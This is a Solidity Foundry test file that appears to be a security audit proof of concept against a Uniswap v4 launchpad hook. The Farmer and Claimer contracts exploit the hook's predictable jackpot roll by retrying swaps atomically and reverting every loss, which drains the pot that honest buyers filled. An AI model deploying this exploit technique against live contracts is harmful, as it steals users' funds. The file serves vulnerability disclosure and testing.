// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {HookrLaunchpad} from "../src/HookrLaunchpad.sol";
import {HookrToken} from "../src/HookrToken.sol";
import {HookrHook} from "../src/HookrHook.sol";
import {HookMiner} from "./utils/HookMiner.sol";

/// @notice PoC: the jackpot roll is fully determined by values the caller controls at call time,
///         so an attacker can retry atomically (reverting every loss) and win with certainty.
contract AuditVL4 is Test {
    uint160 constant HOOK_FLAGS = uint160((1 << 13) | (1 << 7) | (1 << 3));
    IPoolManager constant pm = IPoolManager(0x8366a39CC670B4001A1121B8F6A443A643e40951);

    HookrLaunchpad pad;
    HookrHook hook;
    PoolSwapTest router;

    address creator = address(0xC0FFEE);
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        vm.createSelectFork("robinhood");
        pad = new HookrLaunchpad(pm);
        bytes memory creation = abi.encodePacked(type(HookrHook).creationCode, abi.encode(address(pm), address(pad)));
        (address predicted, bytes32 salt) = HookMiner.find(address(this), HOOK_FLAGS, creation);
        hook = new HookrHook{salt: salt}(pm, address(pad));
        require(address(hook) == predicted, "mine");
        pad.setHook(hook);
        router = new PoolSwapTest(pm);
        vm.deal(creator, 1000 ether);
        vm.deal(alice, 1000 ether);
        vm.deal(bob, 1000 ether);
    }

    function _graduate() internal returns (address token, PoolKey memory key) {
        HookrLaunchpad.LaunchArgs memory a;
        a.name = "Pot";
        a.symbol = "POT";
        a.targetRaiseWei = 0.01 ether;
        a.custom.baseFeePips = 3000;
        a.custom.maxFeePips = 3000;
        a.custom.potBps = 500; // 5% of every buy into the pot
        a.custom.potOdds = 100; // advertised 1-in-100
        a.custom.potMinBuyWei = 1e12;

        uint256 f = pad.creationFeeWei();
        vm.prank(creator);
        token = pad.launch{value: f}(a);
        vm.prank(alice);
        pad.buy{value: 0.05 ether}(token, 0);
        assertTrue(pad.getLaunch(token).graduated);
        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(token),
            fee: 0x800000,
            tickSpacing: 60,
            hooks: IHooks(address(hook))
        });
    }

    function test_POC_jackpotIsDeterministicallyFarmable() public {
        (, PoolKey memory key) = _graduate();
        vm.roll(block.number + 20); // clear the anti-snipe guard

        // honest buyers fill the pot
        for (uint256 i = 0; i < 5; i++) {
            vm.prank(bob);
            router.swap{value: 0.002 ether}(
                key,
                SwapParams({zeroForOne: true, amountSpecified: -int256(0.002 ether), sqrtPriceLimitX96: 4295128740}),
                PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
                abi.encode(bob)
            );
        }
        uint256 pot = hook.potWei(key.toId());
        console2.log("pot filled by honest buyers (wei)", pot);
        assertGt(pot, 0);

        Farmer f = new Farmer(hook, router);
        vm.deal(address(f), 10 ether);

        // ONE transaction, 1-in-100 advertised odds, <=600 atomic retries
        uint256 winner = f.farm(key, 0.0015 ether, 600);
        console2.log("attempts consumed", winner);

        address w = f.winnerAddr();
        assertTrue(w != address(0), "farmer failed to force a win");
        uint256 won = hook.claimableWei(w);
        assertGe(won, pot, "farmer holds the entire pot");
        assertEq(hook.potWei(key.toId()), 0, "pot drained");

        // and the farmer really can withdraw it
        uint256 before = address(f).balance;
        f.collect(w);
        assertEq(address(f).balance, before + won, "pot extracted to attacker");
        console2.log("ETH extracted (wei)", won);
    }
}

/// @dev Deploys nothing up front: recipients are counterfactual CREATE2 addresses. Only the
///      winning one is ever deployed, so a forced win costs one real swap + one small deploy.
contract Farmer {
    HookrHook public immutable hook;
    PoolSwapTest public immutable router;
    address public winnerAddr;
    bytes32 public winnerSalt;

    constructor(HookrHook h, PoolSwapTest r) {
        hook = h;
        router = r;
    }

    receive() external payable {}

    function predict(bytes32 salt) public view returns (address) {
        bytes32 h = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(type(Claimer).creationCode))
        );
        return address(uint160(uint256(h)));
    }

    function farm(PoolKey calldata key, uint256 ethIn, uint256 tries) external returns (uint256 used) {
        for (uint256 i = 0; i < tries; i++) {
            bytes32 salt = bytes32(i);
            try this.attempt(key, ethIn, salt) {
                winnerSalt = salt;
                winnerAddr = predict(salt);
                return i + 1;
            } catch {
                // lost this roll — the whole attempt (swap included) is rolled back for free
            }
        }
        revert("no win");
    }

    /// @dev external so a losing roll can be reverted without losing the outer transaction
    function attempt(PoolKey calldata key, uint256 ethIn, bytes32 salt) external {
        require(msg.sender == address(this), "self");
        address recipient = predict(salt);
        router.swap{value: ethIn}(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(ethIn), sqrtPriceLimitX96: 4295128740}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            abi.encode(recipient)
        );
        require(hook.claimableWei(recipient) > 0, "lost roll");
    }

    function collect(address expected) external {
        Claimer c = new Claimer{salt: winnerSalt}();
        require(address(c) == expected, "predict mismatch");
        c.pull(hook, payable(address(this)));
    }
}

contract Claimer {
    function pull(HookrHook hook, address payable to) external {
        hook.claim();
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "fwd");
    }

    receive() external payable {}
}
